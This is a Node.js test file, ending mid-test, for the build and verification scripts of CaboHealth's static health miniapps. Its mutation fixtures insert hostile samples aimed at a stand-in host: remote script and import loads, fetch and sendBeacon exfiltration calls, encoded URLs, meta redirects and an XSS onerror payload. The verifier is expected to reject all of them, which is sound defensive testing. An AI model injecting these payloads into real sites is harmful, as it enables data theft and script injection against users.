import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  renameSync,
  rmSync,
  symlinkSync,
  unlinkSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { basename, dirname, join, relative } from 'node:path';
import test from 'node:test';
import { fileURLToPath } from 'node:url';

const projectRoot = fileURLToPath(new URL('..', import.meta.url));
const buildModuleUrl = new URL('../scripts/build-miniapps.mjs', import.meta.url);
const serveModuleUrl = new URL('../scripts/serve-miniapps.mjs', import.meta.url);
const allowedMiniapps = ['clinic-guide', 'healthy-recipes'];
const requiredCsp = {
  'default-src': ["'self'"],
  'script-src': ["'self'"],
  'style-src': ["'self'"],
  'img-src': ["'self'"],
  'connect-src': ["'none'"],
  'font-src': ["'self'"],
  'frame-src': ["'none'"],
  'object-src': ["'none'"],
  'form-action': ["'none'"],
  'base-uri': ["'none'"],
  'worker-src': ["'none'"],
  'media-src': ["'none'"],
};
const task6ASourceFixturePaths = [
  'assets/logo.png',
  'content/recipes.json',
  'miniapps/clinic-guide/app.js',
  'miniapps/clinic-guide/index.html',
  'miniapps/healthy-recipes/app.js',
  'miniapps/healthy-recipes/index.html',
  'miniapps/shared/logo.png',
  'miniapps/shared/motion.js',
  'miniapps/shared/security-headers.conf',
  'miniapps/shared/shell.js',
  'miniapps/shared/styles.css',
  'web-hosting/cabohealth.org/apps/.htaccess',
];

function read(relativePath) {
  return readFileSync(join(projectRoot, relativePath), 'utf8');
}

function readJson(relativePath) {
  return JSON.parse(read(relativePath));
}

function walk(root) {
  if (!existsSync(root)) return [];
  const files = [];
  for (const entry of readdirSync(root, { withFileTypes: true }).sort((a, b) => a.name.localeCompare(b.name))) {
    const path = join(root, entry.name);
    if (entry.isDirectory()) files.push(...walk(path));
    else if (entry.isFile()) files.push(path);
  }
  return files;
}

function byteInventory(root) {
  return walk(root).map((path) => ({
    path: relative(root, path).replaceAll('\\', '/'),
    bytes: readFileSync(path).toString('base64'),
  }));
}

function createTask6ASourceFixture(prefix = 'cabohealth-reviewed-sources-') {
  const root = mkdtempSync(join(tmpdir(), prefix));
  for (const relativePath of task6ASourceFixturePaths) {
    const destination = join(root, relativePath);
    mkdirSync(dirname(destination), { recursive: true });
    writeFileSync(destination, readFileSync(join(projectRoot, relativePath)));
  }
  return root;
}

function parseCsp(value) {
  return Object.fromEntries(value.split(';').map((part) => part.trim()).filter(Boolean).map((part) => {
    const [name, ...tokens] = part.split(/\s+/u);
    return [name, tokens];
  }));
}

function exactConfirmedFacts() {
  const confirmedSource = {
    sourceUrl: 'https://cabohealth.org/contact-source/',
    sourceStatus: 'owner-confirmed-source',
  };
  return {
    status: 'owner-confirmed',
    ownerConfirmedAt: '2026-08-16T18:30:00.000Z',
    facts: {
      publicEmail: { value: 'hello@example.test', ...confirmedSource },
      phone: { value: '+526241234567', ...confirmedSource },
      whatsApp: { value: 'https://wa.me/526241234567', ...confirmedSource },
      address: { value: 'Confirmed clinic address', ...confirmedSource },
      hours: { value: 'Confirmed clinic hours', ...confirmedSource },
      appleMapsDestination: { value: 'https://maps.apple.com/?address=Confirmed%20Clinic', ...confirmedSource },
      serviceLanguages: { value: ['English', 'Español'], ...confirmedSource },
    },
  };
}

async function withHealthyBuild(assertion) {
  const tempRoot = mkdtempSync(join(tmpdir(), 'cabohealth-miniapps-'));
  const outputRoot = join(tempRoot, 'dist');
  try {
    const { buildMiniapps } = await import(buildModuleUrl.href);
    await buildMiniapps({ projectRoot, outputRoot, mode: 'healthy' });
    await assertion(outputRoot);
  } finally {
    rmSync(tempRoot, { recursive: true, force: true });
  }
}

test('source registry contains only the two approved miniapps and the required local shared files', () => {
  const miniappsRoot = join(projectRoot, 'miniapps');
  const actualMiniapps = existsSync(miniappsRoot)
    ? readdirSync(miniappsRoot, { withFileTypes: true })
      .filter((entry) => entry.isDirectory() && !['dist', 'shared'].includes(entry.name))
      .map(({ name }) => name)
      .sort()
    : [];
  assert.deepEqual(actualMiniapps, allowedMiniapps);

  for (const relativePath of [
    'miniapps/shared/styles.css',
    'miniapps/shared/motion.js',
    'miniapps/shared/shell.js',
    'miniapps/shared/logo.png',
    'miniapps/shared/security-headers.conf',
    'miniapps/healthy-recipes/index.html',
    'miniapps/healthy-recipes/app.js',
    'miniapps/clinic-guide/index.html',
    'miniapps/clinic-guide/app.js',
    'web-hosting/cabohealth.org/apps/.htaccess',
  ]) {
    assert.ok(existsSync(join(projectRoot, relativePath)), `missing ${relativePath}`);
  }
});

test('healthy-only build is byte-for-byte deterministic and emits no deployable Clinic Guide', async () => {
  const { buildMiniapps } = await import(buildModuleUrl.href);
  const firstContainer = mkdtempSync(join(tmpdir(), 'cabohealth-miniapps-a-'));
  const secondContainer = mkdtempSync(join(tmpdir(), 'cabohealth-miniapps-b-'));
  const firstRoot = join(firstContainer, 'dist');
  const secondRoot = join(secondContainer, 'dist');
  try {
    await buildMiniapps({ projectRoot, outputRoot: firstRoot, mode: 'healthy' });
    await buildMiniapps({ projectRoot, outputRoot: secondRoot, mode: 'healthy' });
    assert.deepEqual(byteInventory(firstRoot), byteInventory(secondRoot));

    assert.ok(existsSync(join(firstRoot, 'apps/healthy-recipes/index.html')));
    assert.equal(existsSync(join(firstRoot, 'apps/clinic-guide/index.html')), false);
    assert.deepEqual(
      walk(join(firstRoot, 'apps'))
        .filter((path) => basename(path) === 'index.html')
        .map((path) => relative(join(firstRoot, 'apps'), path).replaceAll('\\', '/')),
      ['healthy-recipes/index.html'],
    );
  } finally {
    rmSync(firstContainer, { recursive: true, force: true });
    rmSync(secondContainer, { recursive: true, force: true });
  }
});

test('generated Healthy Recipes document is complete without JavaScript and has exact safe navigation', async () => {
  await withHealthyBuild(async (outputRoot) => {
    const html = readFileSync(join(outputRoot, 'apps/healthy-recipes/index.html'), 'utf8');
    const recipes = readJson('content/recipes.json');

    assert.match(html, /^<!doctype html>\n<html lang="en">/u);
    assert.equal((html.match(/<title>/gu) ?? []).length, 1);
    assert.match(html, /<title>Healthy Recipes \| CaboHealth<\/title>/u);
    assert.match(html, /<meta name="description" content="[^"]+">/u);
    assert.match(html, /<link rel="canonical" href="https:\/\/cabohealth\.org\/apps\/healthy-recipes\/">/u);
    assert.match(html, /<a class="skip-link" href="#main-content">/u);
    assert.equal((html.match(/<main\b/gu) ?? []).length, 1);
    assert.equal((html.match(/<h1\b/gu) ?? []).length, 1);
    assert.match(html, /<h1>\s*<span lang="en" data-locale="en">Healthy Recipes<\/span>\s*<span lang="es-MX" data-locale="es-MX">Recetas saludables<\/span>\s*<\/h1>/u);
    assert.match(html, /data-language="en"[^>]*aria-pressed="true"/u);
    assert.match(html, /data-language="es-MX"[^>]*aria-pressed="false"/u);
    assert.match(html, /aria-live="polite"/u);
    assert.equal((html.match(/data-recipe-slug="/gu) ?? []).length, 12);
    assert.doesNotMatch(html, /<form\b|<textarea\b|type="file"/iu);

    for (const recipe of recipes.recipes) {
      const start = html.indexOf(`data-recipe-slug="${recipe.slug}"`);
      const next = html.indexOf('data-recipe-slug="', start + 1);
      const article = html.slice(start, next === -1 ? html.length : next);
      assert.ok(start >= 0, `missing recipe ${recipe.slug}`);
      assert.match(article, /lang="en" data-locale="en"/u);
      assert.match(article, /lang="es-MX" data-locale="es-MX"/u);
      assert.doesNotMatch(article, /\shidden(?:\s|=|>)/u);
      assert.ok(article.includes(recipe.ingredients.en[0]), `${recipe.slug} English ingredients missing`);
      assert.ok(article.includes(recipe.ingredients['es-MX'][0]), `${recipe.slug} Spanish ingredients missing`);
      assert.ok(article.includes(recipe.steps.en[0]), `${recipe.slug} English steps missing`);
      assert.ok(article.includes(recipe.steps['es-MX'][0]), `${recipe.slug} Spanish steps missing`);
    }

    assert.match(html, /Spinach &amp; Egg Corn Tacos/u);
    for (const [path, english, spanish] of [
      ['privacy', 'Privacy', 'Privacidad'],
      ['terms', 'Terms', 'Términos'],
      ['support', 'Support', 'Soporte'],
      ['report-content', 'Report Content', 'Reportar contenido'],
    ]) {
      assert.match(
        html,
        new RegExp(`<a href="https://cabohealth\\.org/app/${path}/" data-external-action data-label-en="${english}" data-label-es="${spanish}">`, 'u'),
      );
    }
    assert.equal((html.match(/class="external-marker" aria-hidden="true">↗<\/span>/gu) ?? []).length, 4);
    assert.doesNotMatch(html, /target\s*=|window\.open|https:\/\/www\.who\.int|https:\/\/www\.foodsafety\.gov|https:\/\/www\.fsis\.usda\.gov/iu);
  });
});

test('generated HTML and Apache configuration carry equivalent strict CSP', async () => {
  await withHealthyBuild(async (outputRoot) => {
    const html = readFileSync(join(outputRoot, 'apps/healthy-recipes/index.html'), 'utf8');
    const headers = readFileSync(join(outputRoot, 'apps/.htaccess'), 'utf8');
    const metaMatch = html.match(/<meta http-equiv="Content-Security-Policy" content="([^"]+)">/u);
    const headerMatch = headers.match(/Header always set Content-Security-Policy "([^"]+)"/u);
    assert.ok(metaMatch, 'missing CSP meta');
    assert.ok(headerMatch, 'missing CSP server header');
    assert.equal(metaMatch[1], headerMatch[1]);
    assert.deepEqual(parseCsp(metaMatch[1]), requiredCsp);
    assert.doesNotMatch(metaMatch[1], /unsafe-inline|unsafe-eval|data:|blob:|https?:/iu);
  });
});

test('artifact verifier rejects remote resources, active exfiltration, forms, popups and CSP drift', async () => {
  const { verifyBuiltArtifact } = await import(buildModuleUrl.href);
  const mutations = [
    ['remote script', 'index.html', '</body>', '<script src="https://evil.example/x.js"></script></body>'],
    ['remote image', 'index.html', '</body>', '<img src="//evil.example/x.png" alt=""></body>'],
    ['remote srcset', 'index.html', '</body>', '<img src="../shared/logo.png" srcset="https://evil.example/x.png 2x" alt=""></body>'],
    ['popup', 'index.html', 'href="https://cabohealth.org/app/privacy/"', 'target="_blank" href="https://cabohealth.org/app/privacy/"'],
    ['unquoted popup', 'index.html', 'href="https://cabohealth.org/app/privacy/"', 'target=_blank href="https://cabohealth.org/app/privacy/"'],
    ['form', 'index.html', '</body>', '<form action="/collect"><input name="name"></form></body>'],
    ['meta refresh', 'index.html', '</head>', '<meta http-equiv="refresh" content="0;url=https://evil.example"></head>'],
    ['unquoted meta refresh', 'index.html', '</head>', '<meta http-equiv=refresh content="0;url=https://evil.example"></head>'],
    ['inline style element', 'index.html', '</head>', '<style>.x{background:url(https://evil.example/x.png)}</style></head>'],
    ['fetch', 'app.js', '', '\nfetch("https://evil.example/data");'],
    ['xhr', 'app.js', '', '\nnew XMLHttpRequest();'],
    ['worker', 'app.js', '', '\nnew Worker("worker.js");'],
    ['window open', 'app.js', '', '\nwindow.open("/");'],
    ['direct location redirect', 'app.js', '', '\nlocation = "https://evil.example/";'],
    ['send beacon', 'app.js', '', '\nnavigator.sendBeacon("https://evil.example/", "x");'],
    ['dynamic import', 'app.js', '', '\nimport("https://evil.example/module.js");'],
    ['css url', 'styles.css', '', '\n.x{background:url(https://evil.example/x.png)}'],
    ['css import', 'styles.css', '', '\n@import "https://evil.example/x.css";'],
    ['weakened CSP', 'index.html', "connect-src 'none'", "connect-src 'self'"],
    ['numeric entity URL', 'index.html', 'src="../shared/logo.png"', 'src="&#x68;ttps://evil.example/logo.png"'],
    ['named entity URL', 'index.html', 'src="../shared/logo.png"', 'src="https&colon;//evil.example/logo.png"'],
    ['duplicate href', 'index.html', 'href="https://cabohealth.org/app/privacy/"', 'href="https://evil.example/" href="https://cabohealth.org/app/privacy/"'],
    ['quoted tag delimiter', 'index.html', '</body>', '<a title=">" href="https://evil.example/">evil</a></body>'],
    ['SVG xlink navigation', 'index.html', '</body>', '<svg><a xlink:href="https://evil.example/"><text>evil</text></a></svg></body>'],
    ['file input', 'index.html', '</body>', '<input type="file"></body>'],
    ['CSS escaped url', 'styles.css', '', '\n.x{background:u\\72l(https://evil.example/x.png)}'],
    ['computed global fetch', 'app.js', '', '\nglobalThis["fetch"]("https://evil.example/data");'],
    ['computed window location', 'app.js', '', '\nwindow["location"]["href"] = "https://evil.example/";'],
    ['file reader', 'app.js', '', '\nnew FileReader();'],
    ['directory indexing', 'headers', 'Options -Indexes', 'Options Indexes'],
    ['server CSP drift', 'headers', "connect-src 'none'", "connect-src 'self'"],
    ['missing nosniff', 'headers', 'Header always set X-Content-Type-Options "nosniff"', 'Header always set X-Content-Type-Options ""'],
    ['missing frame denial', 'headers', 'Header always set X-Frame-Options "DENY"', 'Header always set X-Frame-Options "SAMEORIGIN"'],
    ['referrer drift', 'headers', 'Header always set Referrer-Policy "no-referrer"', 'Header always set Referrer-Policy "origin"'],
    ['permissions drift', 'headers', 'payment=()', 'payment=(self)'],
  ];

  for (const [label, relativePath, needle, replacement] of mutations) {
    await withHealthyBuild(async (outputRoot) => {
      const verify = () => verifyBuiltArtifact({
        projectRoot,
        outputRoot,
        expectedEntrySlugs: ['healthy-recipes'],
      });
      assert.equal(verify(), true, `${label} fixture must begin verified`);
      const path = relativePath === 'index.html'
        ? join(outputRoot, 'apps/healthy-recipes/index.html')
        : relativePath === 'app.js'
          ? join(outputRoot, 'apps/healthy-recipes/app.js')
          : relativePath === 'styles.css'
            ? join(outputRoot, 'apps/shared/styles.css')
            : join(outputRoot, 'apps/.htaccess');
      const original = readFileSync(path, 'utf8');
      writeFileSync(path, needle ? original.replace(needle, replacement) : original + replacement);
      assert.throws(
        verify,
        undefined,
        label,
      );
    });
  }
});

test('reviewed source attestation rejects browser-policy mutations before they can become expected output', async () => {
  const { createHealthyArtifactPlan } = await import(buildModuleUrl.href);
  const mutations = [
    ['HTML entity URL', 'miniapps/healthy-recipes/index.html', '</body>', '<img src="&#x68;ttps://evil.example/logo.png" alt=""></body>'],
    ['duplicate HTML navigation', 'miniapps/healthy-recipes/index.html', '</body>', '<a href="https://evil.example/" href="#main-content">evil</a></body>'],
    ['quoted tag delimiter', 'miniapps/healthy-recipes/index.html', '</body>', '<a title=">" href="https://evil.example/">evil</a></body>'],
    ['SVG navigation', 'miniapps/healthy-recipes/index.html', '</body>', '<svg><a xlink:href="https://evil.example/"><text>evil</text></a></svg></body>'],
    ['file input', 'miniapps/healthy-recipes/index.html', '</body>', '<input type="file"></body>'],
    ['computed fetch', 'miniapps/healthy-recipes/app.js', '', '\nglobalThis["fetch"]("https://evil.example/data");'],
    ['computed navigation', 'miniapps/healthy-recipes/app.js', '', '\nwindow["location"]["href"] = "https://evil.example/";'],
    ['file reader', 'miniapps/healthy-recipes/app.js', '', '\nnew FileReader();'],
    ['CSS escape', 'miniapps/shared/styles.css', '', '\n.x{background:u\\72l(https://evil.example/x.png)}'],
    ['nondeployable Clinic source drift', 'miniapps/clinic-guide/app.js', '', '\n// unreviewed source drift'],
    ['editorial source drift', 'content/recipes.json', 'USDA FSIS — Food Allergies: The Big 9', 'Unreviewed source title'],
  ];

  for (const [label, relativePath, needle, replacement] of mutations) {
    const fixtureRoot = createTask6ASourceFixture();
    try {
      assert.ok(createHealthyArtifactPlan(fixtureRoot), `${label} fixture must begin attested`);
      const path = join(fixtureRoot, relativePath);
      const original = readFileSync(path, 'utf8');
      writeFileSync(path, needle ? original.replace(needle, replacement) : original + replacement);
      assert.throws(
        () => createHealthyArtifactPlan(fixtureRoot),
        /REVIEWED_SOURCE_ATTESTATION|reviewed source/iu,
        label,
      );
    } finally {
      rmSync(fixtureRoot, { recursive: true, force: true });
    }
  }
});

test('artifact verifier requires the exact non-release manifest and complete sorted hash inventory', async () => {
  const { verifyBuiltArtifact } = await import(buildModuleUrl.href);
  const mutations = [
    ['missing manifest', (outputRoot) => unlinkSync(join(outputRoot, 'manifest.json'))],
    ['release-ready flip', (outputRoot, manifest) => ({ ...manifest, releaseReady: true })],
    ['wrong mode', (outputRoot, manifest) => ({ ...manifest, mode: 'release' })],
    ['Clinic entry leak', (outputRoot, manifest) => ({ ...manifest, entrySlugs: ['healthy-recipes', 'clinic-guide'] })],
    ['missing blocked Clinic entry', (outputRoot, manifest) => ({ ...manifest, blockedEntrySlugs: [] })],
    ['wrong source version', (outputRoot, manifest) => ({ ...manifest, sourceVersion: '9.9.9' })],
    ['extra root key', (outputRoot, manifest) => ({ ...manifest, deployable: true })],
    ['empty inventory', (outputRoot, manifest) => ({ ...manifest, files: [] })],
    ['stale hash', (outputRoot, manifest) => ({
      ...manifest,
      files: manifest.files.map((file, index) => index === 0 ? { ...file, sha256: '0'.repeat(64) } : file),
    })],
    ['stale size', (outputRoot, manifest) => ({
      ...manifest,
      files: manifest.files.map((file, index) => index === 0 ? { ...file, size: file.size + 1 } : file),
    })],
    ['extra file-row key', (outputRoot, manifest) => ({
      ...manifest,
      files: manifest.files.map((file, index) => index === 0 ? { ...file, executable: false } : file),
    })],
    ['duplicate inventory path', (outputRoot, manifest) => ({
      ...manifest,
      files: [...manifest.files, { ...manifest.files.at(-1) }],
    })],
    ['unsorted inventory', (outputRoot, manifest) => ({ ...manifest, files: [...manifest.files].reverse() })],
    ['traversal inventory path', (outputRoot, manifest) => ({
      ...manifest,
      files: manifest.files.map((file, index) => index === 0 ? { ...file, path: '../outside' } : file),
    })],
    ['noncanonical JSON bytes', (outputRoot, manifest) => {
      writeFileSync(join(outputRoot, 'manifest.json'), JSON.stringify(manifest));
    }],
    ['coordinated artifact and manifest tamper', (outputRoot, manifest) => {
      const path = join(outputRoot, 'apps/healthy-recipes/app.js');
      const bytes = Buffer.from('globalThis["fetch"]("https://evil.example/");\n');
      writeFileSync(path, bytes);
      return {
        ...manifest,
        files: manifest.files.map((file) => file.path === 'apps/healthy-recipes/app.js'
          ? { ...file, size: bytes.byteLength, sha256: createHash('sha256').update(bytes).digest('hex') }
          : file),
      };
    }],
    ['extra artifact', (outputRoot) => writeFileSync(join(outputRoot, 'unexpected.txt'), 'unexpected\n')],
  ];

  for (const [label, mutate] of mutations) {
    await withHealthyBuild(async (outputRoot) => {
      const verify = () => verifyBuiltArtifact({
        projectRoot,
        outputRoot,
        expectedEntrySlugs: ['healthy-recipes'],
      });
      assert.equal(verify(), true, `${label} fixture must begin verified`);
      const manifestPath = join(outputRoot, 'manifest.json');
      const manifest = JSON.parse(readFileSync(manifestPath, 'utf8'));
      const replacement = mutate(outputRoot, manifest);
      if (replacement) writeFileSync(manifestPath, `${JSON.stringify(replacement, null, 2)}\n`);
      assert.throws(
        verify,
        undefined,
        label,
      );
    });
  }
});

test('renderer HTML-escapes canonical content before it reaches the static document', async () => {
  const { renderHealthyRecipesDocument } = await import(buildModuleUrl.href);
  const content = readJson('content/recipes.json');
  content.recipes[0].summary.en = '<img src="https://evil.example/x" onerror="alert(1)">';
  const html = renderHealthyRecipesDocument(
    read('miniapps/healthy-recipes/index.html'),
    content,
  );
  assert.doesNotMatch(html, /<img src="https:\/\/evil\.example/u);
  assert.match(html, /&lt;img src=&quot;https:\/\/evil\.example\/x&quot; onerror=&quot;alert\(1\)&quot;&gt;/u);
});

test('production build rejects every incomplete or malformed owner-fact record', async () => {
  const { validatePublicContactFacts } = await import(buildModuleUrl.href);
  const valid = exactConfirmedFacts();
  assert.deepEqual(validatePublicContactFacts(valid), []);

  const invalidRecords = [];
  for (const omitted of Object.keys(valid.facts)) {
    const record = structuredClone(valid);
    delete record.facts[omitted];
    invalidRecords.push(record);
  }
  const extra = structuredClone(valid);
  extra.facts.extraContact = structuredClone(valid.facts.phone);
  invalidRecords.push(extra);
  invalidRecords.push({ ...structuredClone(valid), status: 'awaiting-owner-confirmation' });
  invalidRecords.push({ ...structuredClone(valid), ownerConfirmedAt: 'not-a-timestamp' });

  const badSource = structuredClone(valid);
  badSource.facts.phone.sourceUrl = ' http://cabohealth.org/contact/ ';
  invalidRecords.push(badSource);
  const badSourceStatus = structuredClone(valid);
  badSourceStatus.facts.hours.sourceStatus = 'owner-confirmation-required';
  invalidRecords.push(badSourceStatus);
  const blankLanguages = structuredClone(valid);
  blankLanguages.facts.serviceLanguages.value = ['English', ' '];
  invalidRecords.push(blankLanguages);

  for (const [index, record] of invalidRecords.entries()) {
    assert.notDeepEqual(validatePublicContactFacts(record), [], `invalid record ${index} passed`);
  }
});

test('production build fails closed before touching output while owner facts or Task 6B are pending', async () => {
  const { buildMiniapps } = await import(buildModuleUrl.href);
  const tempRoot = mkdtempSync(join(tmpdir(), 'cabohealth-release-gate-'));
  const outputRoot = join(tempRoot, 'dist');
  mkdirSync(outputRoot);
  writeFileSync(join(outputRoot, 'sentinel.txt'), 'preserve me\n');
  try {
    await assert.rejects(
      buildMiniapps({ projectRoot, outputRoot, mode: 'release' }),
      /PUBLIC_CONTACT_FACTS_INCOMPLETE/u,
    );
    assert.equal(readFileSync(join(outputRoot, 'sentinel.txt'), 'utf8'), 'preserve me\n');

    await assert.rejects(
      buildMiniapps({ projectRoot, outputRoot, mode: 'release', contactFacts: exactConfirmedFacts() }),
      /CLINIC_GUIDE_TASK_6B_PENDING/u,
    );
    assert.equal(readFileSync(join(outputRoot, 'sentinel.txt'), 'utf8'), 'preserve me\n');
  } finally {
    rmSync(tempRoot, { recursive: true, force: true });
  }
});

test('builder refuses a broad output target outside the exact dist or isolated temp scope', async () => {
  const { assertSafeMiniappOutputPath } = await import(buildModuleUrl.href);
  assert.throws(
    () => assertSafeMiniappOutputPath({ projectRoot, outputRoot: projectRoot }),
    /unsafe miniapp output path/iu,
  );
  assert.throws(
    () => assertSafeMiniappOutputPath({ projectRoot, outputRoot: '/tmp' }),
    /unsafe miniapp output path/iu,
  );
  assert.equal(
    assertSafeMiniappOutputPath({ projectRoot, outputRoot: join(projectRoot, 'miniapps/dist') }),
    join(projectRoot, 'miniapps/dist'),
  );
});

test('builder rejects symlinked ancestors for canonical and isolated temporary outputs', async () => {
  const { assertSafeMiniappOutputPath } = await import(buildModuleUrl.href);
  const fixtureRoot = mkdtempSync(join(tmpdir(), 'cabohealth-output-ancestors-'));
  const project = join(fixtureRoot, 'project');
  const redirectedMiniapps = join(fixtureRoot, 'redirected-miniapps');
  const isolated = join(fixtureRoot, 'isolated');
  const redirectedOutput = join(fixtureRoot, 'redirected-output');
  mkdirSync(project);
  mkdirSync(redirectedMiniapps);
  mkdirSync(isolated);
  mkdirSync(redirectedOutput);
  symlinkSync(redirectedMiniapps, join(project, 'miniapps'), 'dir');
  symlinkSync(redirectedOutput, join(isolated, 'linked-parent'), 'dir');

  try {
    assert.throws(
      () => assertSafeMiniappOutputPath({
        projectRoot: project,
        outputRoot: join(project, 'miniapps/dist'),
      }),
      /symlink|real path|unsafe/iu,
    );
    assert.throws(
      () => assertSafeMiniappOutputPath({
        projectRoot: project,
        outputRoot: join(isolated, 'linked-parent/dist'),
      }),
      /symlink|real path|unsafe/iu,
    );
  } finally {
    rmSync(fixtureRoot, { recursive: true, force: true });
  }
});

test('builder revalidates output ownership immediately before destructive replacement', async () => {
  const { buildMiniapps } = await import(buildModuleUrl.href);
  const tempRoot = mkdtempSync(join(tmpdir(), 'cabohealth-output-race-'));
  const outputRoot = join(tempRoot, 'dist');
  const displacedOutput = join(tempRoot, 'displaced-output');
  const outside = mkdtempSync(join(tmpdir(), 'cabohealth-output-outside-'));
  writeFileSync(join(outside, 'sentinel.txt'), 'must survive\n');

  try {
    await buildMiniapps({ projectRoot, outputRoot, mode: 'healthy' });
    const oldManifest = readFileSync(join(outputRoot, 'manifest.json'));
    await assert.rejects(
      buildMiniapps({
        projectRoot,
        outputRoot,
        mode: 'healthy',
        beforeFilesystemOperation({ operation }) {
          if (operation !== 'remove-output') return;
          renameSync(outputRoot, displacedOutput);
          symlinkSync(outside, outputRoot, 'dir');
        },
      }),
      /symlink|ownership|unsafe/iu,
    );
    assert.equal(readFileSync(join(outside, 'sentinel.txt'), 'utf8'), 'must survive\n');
    assert.deepEqual(readFileSync(join(displacedOutput, 'manifest.json')), oldManifest);
  } finally {
    rmSync(tempRoot, { recursive: true, force: true });
    rmSync(outside, { recursive: true, force: true });
  }
});

test('builder rejects a same-path real-directory replacement before destructive output removal', async () => {
  const { buildMiniapps } = await import(buildModuleUrl.href);
  const tempRoot = mkdtempSync(join(tmpdir(), 'cabohealth-output-identity-'));
  const outputRoot = join(tempRoot, 'dist');
  const displacedOutput = join(tempRoot, 'displaced-output');

  try {
    await buildMiniapps({ projectRoot, outputRoot, mode: 'healthy' });
    const oldManifest = readFileSync(join(outputRoot, 'manifest.json'));
    await assert.rejects(
      buildMiniapps({
        projectRoot,
        outputRoot,
        mode: 'healthy',
        beforeFilesystemOperation({ operation }) {
          if (operation !== 'remove-output') return;
          renameSync(outputRoot, displacedOutput);
          mkdirSync(outputRoot);
          writeFileSync(join(outputRoot, 'replacement.txt'), 'do not delete\n');
        },
      }),
      /identity|ownership|changed/iu,
    );
    assert.equal(readFileSync(join(outputRoot, 'replacement.txt'), 'utf8'), 'do not delete\n');
    assert.deepEqual(readFileSync(join(displacedOutput, 'manifest.json')), oldManifest);
  } finally {
    rmSync(tempRoot, { recursive: true, force: true });
  }
});

test('builder refuses to delete a target that self-certifies coordinated artifact tampering', async () => {
  const { buildMiniapps } = await import(buildModuleUrl.href);
  const tempRoot = mkdtempSync(join(tmpdir(), 'cabohealth-output-self-certified-'));
  const outputRoot = join(tempRoot, 'dist');

  try {
    await buildMiniapps({ projectRoot, outputRoot, mode: 'healthy' });
    const artifactPath = join(outputRoot, 'apps/healthy-recipes/app.js');
    const tamperedBytes = Buffer.from('globalThis["fetch"]("https://evil.example/");\n');
    writeFileSync(artifactPath, tamperedBytes);
    const manifestPath = join(outputRoot, 'manifest.json');
    const manifest = JSON.parse(readFileSync(manifestPath, 'utf8'));
    manifest.files = manifest.files.map((entry) => entry.path === 'apps/healthy-recipes/app.js'
      ? {
          ...entry,
          size: tamperedBytes.byteLength,
          sha256: createHash('sha256').update(tamperedBytes).digest('hex'),
        }
      : entry);
    writeFileSync(manifestPath, `${JSON.stringify(manifest, null, 2)}\n`);

    await assert.rejects(
      buildMiniapps({ projectRoot, outputRoot, mode: 'healthy' }),
      /ownership|attestation|bytes mismatch|verified/iu,
    );
    assert.deepEqual(readFileSync(artifactPath), tamperedBytes, 'untrusted target must not be deleted');
  } finally {
    rmSync(tempRoot, { recursive: true, force: true });
  }
});

test('builder revalidates target identity after independent ownership verification', async () => {
  const { buildMiniapps } = await import(buildModuleUrl.href);
  const tempRoot = mkdtempSync(join(tmpdir(), 'cabohealth-output-post-attestation-race-'));
  const outputRoot = join(tempRoot, 'dist');
  const displacedOutput = join(tempRoot, 'displaced-output');

  try {
    await buildMiniapps({ projectRoot, outputRoot, mode: 'healthy' });
    await assert.rejects(
      buildMiniapps({
        projectRoot,
        outputRoot,
        mode: 'healthy',
        beforeFilesystemOperation({ operation }) {
          if (operation !== 'after-output-ownership-verification') return;
          renameSync(outputRoot, displacedOutput);
          mkdirSync(outputRoot);
          writeFileSync(join(outputRoot, 'replacement.txt'), 'must survive\n');
        },
      }),
      /identity|ownership|changed/iu,
    );
    assert.equal(readFileSync(join(outputRoot, 'replacement.txt'), 'utf8'), 'must survive\n');
    assert.ok(existsSync(join(displacedOutput, 'manifest.json')));
  } finally {
    rmSync(tempRoot, { recursive: true, force: true });
  }
});

test('builder revalidates the owned stage immediately before recursive cleanup', async () => {
  const { buildMiniapps } = await import(buildModuleUrl.href);
  const tempRoot = mkdtempSync(join(tmpdir(), 'cabohealth-stage-race-'));
  const outputRoot = join(tempRoot, 'dist');
  const stage = join(tempRoot, '.dist-stage');
  const displacedStage = join(tempRoot, 'displaced-stage');
  const outside = mkdtempSync(join(tmpdir(), 'cabohealth-stage-outside-'));
  mkdirSync(stage);
  writeFileSync(join(stage, '.cabohealth-stage-owner'), 'cabohealth-miniapps-task-6a-stage-v1\n');
  writeFileSync(join(stage, 'partial.txt'), 'owned partial stage\n');
  writeFileSync(join(outside, 'sentinel.txt'), 'must survive\n');

  try {
    await assert.rejects(
      buildMiniapps({
        projectRoot,
        outputRoot,
        mode: 'healthy',
        beforeFilesystemOperation({ operation }) {
          if (operation !== 'remove-stage') return;
          renameSync(stage, displacedStage);
          symlinkSync(outside, stage, 'dir');
        },
      }),
      /symlink|identity|ownership|unsafe/iu,
    );
    assert.equal(readFileSync(join(outside, 'sentinel.txt'), 'utf8'), 'must survive\n');
    assert.equal(readFileSync(join(displacedStage, 'partial.txt'), 'utf8'), 'owned partial stage\n');
  } finally {
    rmSync(tempRoot, { recursive: true, force: true });
    rmSync(outside, { recursive: true, force: true });
  }
});

test('builder removes only the exact controlled partial staging directory and recovers', async () => {
  const { buildMiniapps } = await import(buildModuleUrl.href);
  const stage = join(projectRoot, 'miniapps/.dist-stage');
  mkdirSync(stage, { recursive: true });
  writeFileSync(join(stage, '.cabohealth-stage-owner'), 'cabohealth-miniapps-task-6a-stage-v1\n');
  writeFileSync(join(stage, 'partial.txt'), 'interrupted\n');

  try {
    await buildMiniapps({
      projectRoot,
      outputRoot: join(projectRoot, 'miniapps/dist'),
      mode: 'healthy',
    });
    assert.equal(existsSync(stage), false);
  } finally {
    rmSync(stage, { recursive: true, force: true });
  }
});

test('builder atomically publishes stage ownership and recovers zero or truncated initialization markers', async () => {
  const {
    buildMiniapps,
    CONTROLLED_STAGE_OWNER_FILE,
    CONTROLLED_STAGE_OWNER_VALUE,
  } = await import(buildModuleUrl.href);

  for (const marker of ['', CONTROLLED_STAGE_OWNER_VALUE.slice(0, 11)]) {
    const tempRoot = mkdtempSync(join(tmpdir(), 'cabohealth-partial-stage-owner-'));
    const outputRoot = join(tempRoot, 'dist');
    const stage = join(tempRoot, '.dist-stage');
    mkdirSync(stage);
    writeFileSync(join(stage, CONTROLLED_STAGE_OWNER_FILE), marker);
    let observedAtomicPublication = false;
    try {
      await buildMiniapps({
        projectRoot,
        outputRoot,
        mode: 'healthy',
        beforeFilesystemOperation(details) {
          if (details.operation !== 'publish-owned-stage') return;
          observedAtomicPublication = true;
